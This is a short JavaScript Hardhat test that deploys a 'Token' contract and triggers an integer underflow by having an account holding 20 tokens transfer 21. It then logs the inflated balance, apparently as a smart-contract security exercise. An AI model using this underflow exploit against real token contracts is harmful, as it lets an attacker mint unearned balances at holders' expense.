const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");

describe("Token", function () {
  it("Should obtain a large amount of token", async function () {
    const [_, eoa, eoa2] = await ethers.getSigners()
    const Contract = await ethers.getContractFactory("Token")
    const contract = await Contract.deploy(1000)
    await contract.deployed()

    // Transfer 20 tokens to our address
    await contract.transfer(eoa.address, 20)

    // Transfer 21 tokens to another address to cause underflow
    await contract.connect(eoa).transfer(eoa2.address, 21)

    // Balance should be a vary large number
    const balance = await contract.balanceOf(eoa.address)
    console.log(balance.toString())

  });
});
